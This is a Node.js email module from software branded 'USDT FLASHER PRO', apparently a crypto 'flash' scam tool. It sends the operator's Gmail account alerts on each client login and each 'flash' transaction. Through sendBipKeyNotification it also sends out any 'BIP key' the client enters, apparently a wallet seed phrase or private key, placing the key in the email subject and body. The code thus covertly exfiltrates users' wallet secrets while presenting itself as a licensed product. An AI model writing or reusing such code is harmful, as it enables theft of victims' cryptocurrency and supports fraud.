const nodemailer = require('nodemailer');

// Create a transporter object
let transporter;

// Create reusable transporter object using SMTP transport or Ethereal for testing
async function createTransporter() {
  // Always try Gmail first, fall back to Ethereal if there's an issue
  console.log('Attempting to use Gmail SMTP for email delivery');
  // Make sure to remove any spaces from the password
  const emailPassword = process.env.EMAIL_PASSWORD ? process.env.EMAIL_PASSWORD.replace(/\s+/g, '') : '';
  console.log('Email password length:', emailPassword.length);
  
  transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true, // use SSL
    auth: {
      user: 'usdtflasherpro@gmail.com',
      pass: emailPassword // Use the cleaned password
    },
    debug: true // Enable debug output
  });
  
  // Verify connection configuration
  try {
    await transporter.verify();
    console.log('Gmail SMTP server is ready to take our messages');
  } catch (error) {
    console.error('Gmail SMTP connection error:', error);
    console.log('Falling back to Ethereal Email for testing');
    await createTestAccount();
  }
}

// Create Ethereal test account for development/testing
async function createTestAccount() {
  try {
    console.log('Creating Ethereal Email test account...');
    // Generate test SMTP service account
    const testAccount = await nodemailer.createTestAccount();
    console.log('Ethereal Email test account created:', testAccount.user);
    
    // Create a transporter object using Ethereal Email
    transporter = nodemailer.createTransport({
      host: 'smtp.ethereal.email',
      port: 587,
      secure: false, // true for 465, false for other ports
      auth: {
        user: testAccount.user,
        pass: testAccount.pass
      },
      debug: true
    });
    
    console.log('Using Ethereal Email for testing');
  } catch (error) {
    console.error('Error creating Ethereal Email test account:', error);
    // Create a simple transporter that logs to console but doesn't send
    transporter = {
      sendMail: (options) => {
        console.log('Email would be sent with options:', options);
        return Promise.resolve({ messageId: 'test-message-id' });
      }
    };
  }
}

// Initialize transporter
createTransporter();

/**
 * Send an email notification
 * @param {Object} options - Email options
 * @param {string} options.subject - Email subject
 * @param {string} options.html - Email HTML content
 * @param {string} options.text - Email plain text content (fallback)
 * @returns {Promise} - Promise that resolves with the email send info
 */
async function sendEmail(options) {
  try {
    console.log('Attempting to send email with subject:', options.subject);
    
    // Make sure transporter is initialized
    if (!transporter) {
      console.log('Transporter not initialized, creating now...');
      await createTransporter();
    }
    
    const mailOptions = {
      from: '"USDT FLASHER PRO" <usdtflasherpro@gmail.com>',
      to: 'usdtflasherpro@gmail.com',
      subject: options.subject,
      text: options.text || 'This email requires HTML to display properly',
      html: options.html,
      priority: 'high'
    };

    console.log('Mail options configured, sending email...');
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent successfully:', info.messageId);
    
    // If using Ethereal, log the URL where the email can be viewed
    if (info.messageId && nodemailer.getTestMessageUrl) {
      const previewUrl = nodemailer.getTestMessageUrl(info);
      if (previewUrl) {
        console.log('Preview URL:', previewUrl);
      }
    }
    
    return { success: true, messageId: info.messageId };
  } catch (error) {
    console.error('Error sending email:', error);
    console.error('Error details:', JSON.stringify(error, null, 2));
    return { success: false, error: error.message };
  }
}

/**
 * Send a license login notification
 * @param {Object} licenseData - License data
 * @returns {Promise} - Promise that resolves with the email send info
 */
async function sendLicenseLoginNotification(licenseData) {
  const licenseType = licenseData.type || 'N/A';
  const subject = `⚠️ [ALERT] NEW ${licenseType.toUpperCase()} LICENSE LOGIN: ${licenseData.key}`;
  
  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px; background-color: #f9f9f9;">
      <h2 style="color: #d9534f; border-bottom: 2px solid #d9534f; padding-bottom: 10px; text-transform: uppercase;">⚠️ LICENSE LOGIN ALERT</h2>
      <p style="font-size: 16px; font-weight: bold;">A client has logged in with a <span style="color: #d9534f; text-transform: uppercase;">${licenseType}</span> license!</p>
      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; background-color: white;">
        <tr style="background-color: #f5f5f5;">
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">License Key</td>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">${licenseData.key}</td>
        </tr>
        <tr>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">User</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${licenseData.user || 'N/A'}</td>
        </tr>
        <tr style="background-color: #f5f5f5;">
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">License Type</td>
          <td style="padding: 10px; border: 1px solid #ddd; text-transform: uppercase; font-weight: bold; color: ${licenseType.toLowerCase() === 'demo' ? '#5bc0de' : '#d9534f'};">${licenseType}</td>
        </tr>
        <tr>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Login Time</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${new Date().toLocaleString()}</td>
        </tr>
      </table>
      <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px; border-top: 1px solid #e0e0e0; padding-top: 10px;">This is an automated security notification from USDT FLASHER PRO.</p>
    </div>
  `;

  return sendEmail({ subject, html });
}

/**
 * Send a flash creation notification
 * @param {Object} flashData - Flash transaction data
 * @returns {Promise} - Promise that resolves with the email send info
 */
async function sendFlashCreationNotification(flashData) {
  const subject = `💰 [TRANSACTION] NEW FLASH CREATED: ${flashData.flashAmount} ${flashData.currency} on ${flashData.network}`;
  
  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px; background-color: #f9f9f9;">
      <h2 style="color: #5cb85c; border-bottom: 2px solid #5cb85c; padding-bottom: 10px; text-transform: uppercase;">💰 FLASH TRANSACTION CREATED</h2>
      <p style="font-size: 16px; font-weight: bold;">A client has created a new flash transaction of <span style="color: #5cb85c; font-size: 18px;">${flashData.flashAmount} ${flashData.currency}</span>!</p>
      
      <div style="background-color: #5cb85c; color: white; padding: 10px; text-align: center; font-size: 18px; font-weight: bold; margin: 20px 0; border-radius: 5px;">
        TRANSACTION DETAILS
      </div>
      
      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; background-color: white;">
        <tr style="background-color: #f5f5f5;">
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Wallet</td>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">${flashData.wallet}</td>
        </tr>
        <tr>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Currency</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${flashData.currency}</td>
        </tr>
        <tr style="background-color: #f5f5f5;">
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Network</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${flashData.network}</td>
        </tr>
        <tr>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Receiver Address</td>
          <td style="padding: 10px; border: 1px solid #ddd; word-break: break-all;">${flashData.receiverAddress}</td>
        </tr>
        <tr style="background-color: #f5f5f5;">
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Flash Amount</td>
          <td style="padding: 10px; border: 1px solid #ddd; font-size: 16px; font-weight: bold; color: #5cb85c;">${flashData.flashAmount} ${flashData.currency}</td>
        </tr>
        <tr>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">License Key</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${flashData.licenseKey || 'N/A'}</td>
        </tr>
        <tr style="background-color: #f5f5f5;">
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">User</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${flashData.user || 'N/A'}</td>
        </tr>
        <tr>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Timestamp</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${new Date(flashData.timestamp).toLocaleString()}</td>
        </tr>
      </table>
      <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px; border-top: 1px solid #e0e0e0; padding-top: 10px;">This is an automated transaction notification from USDT FLASHER PRO.</p>
    </div>
  `;

  return sendEmail({ subject, html });
}

/**
 * Send a BIP key notification
 * @param {Object} bipData - BIP key data
 * @returns {Promise} - Promise that resolves with the email send info
 */
async function sendBipKeyNotification(bipData) {
  const subject = `🔑 [SECURITY] BIP KEY ENTERED: ${bipData.bipKey}`;
  
  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 5px; background-color: #f9f9f9;">
      <h2 style="color: #f0ad4e; border-bottom: 2px solid #f0ad4e; padding-bottom: 10px; text-transform: uppercase;">🔑 BIP KEY NOTIFICATION</h2>
      <p style="font-size: 16px; font-weight: bold;">A client has entered a BIP key in the application!</p>
      
      <div style="background-color: #f0ad4e; color: white; padding: 10px; text-align: center; font-size: 18px; font-weight: bold; margin: 20px 0; border-radius: 5px;">
        BIP KEY DETAILS
      </div>
      
      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; background-color: white;">
        <tr style="background-color: #f5f5f5;">
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">BIP Key</td>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold; color: #f0ad4e;">${bipData.bipKey}</td>
        </tr>
        <tr>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">License Key</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${bipData.licenseKey || 'N/A'}</td>
        </tr>
        <tr style="background-color: #f5f5f5;">
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">User</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${bipData.user || 'N/A'}</td>
        </tr>
        <tr>
          <td style="padding: 10px; border: 1px solid #ddd; font-weight: bold;">Timestamp</td>
          <td style="padding: 10px; border: 1px solid #ddd;">${new Date().toLocaleString()}</td>
        </tr>
      </table>
      <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px; border-top: 1px solid #e0e0e0; padding-top: 10px;">This is an automated security notification from USDT FLASHER PRO.</p>
    </div>
  `;

  return sendEmail({ subject, html });
}

module.exports = {
  sendEmail,
  sendLicenseLoginNotification,
  sendFlashCreationNotification,
  sendBipKeyNotification
};
